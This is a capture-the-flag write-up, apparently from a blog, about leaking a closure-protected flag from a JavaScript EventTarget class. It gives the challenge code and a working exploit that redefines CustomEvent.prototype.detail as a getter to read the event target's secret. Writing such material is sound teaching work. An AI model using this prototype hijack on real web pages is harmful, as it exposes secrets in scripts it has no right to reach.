Leaking Through Prototype Getters

A closure-locked Secret class stashes a flag on this. Hijacking the event prototype turns a property read into an exfiltration primitive.

Description

A closure builds a Secret class that keeps a flag on this.flag. Validation runs by dispatching CustomEvent('validate', { detail: text }) and comparing e.detail === this.flag inside the listener.

Code

<script>
const validate = (function () {
    const SecretEvent = CustomEvent;
    class Secret extends EventTarget {
        constructor() {
            super();
            this.flag = `FLAG{${parseInt(Math.random() * Number.MAX_SAFE_INTEGER).toString(36)}}`;
            this.addEventListener('validate', e => {
                if (e.detail === this.flag) {
                    result.innerHTML = 'Good! But can you leak the flag?';
                } else {
                    result.innerHTML = 'Wrong password!';
                }
            });
        }
        validate(text) {
            this.dispatchEvent(new SecretEvent('validate', { detail: text }));
        }
    }
    return text => { new Secret().validate(text) };
})();
</script>
<script>
    EventTarget = null;
    validate("hello");
</script>

What's Happening

The listener reads e.detail while the secret lives on event.target. If we can run code at the moment e.detail is read, we get access to this.target.flag — the flag itself.

The Exploit

Replace CustomEvent.prototype.detail with a getter. When the listener reads e.detail, the getter runs with this bound to the event, so this.target is the Secret instance and this.target.flag is the flag. 

new CustomEvent('').__proto__.__defineGetter__('detail', function () {
    alert(this.target.flag);
});

TL;DR

Mutate CustomEvent.prototype.detail into a getter. When e.detail is read, the getter runs, and this.target.flag leaks out.
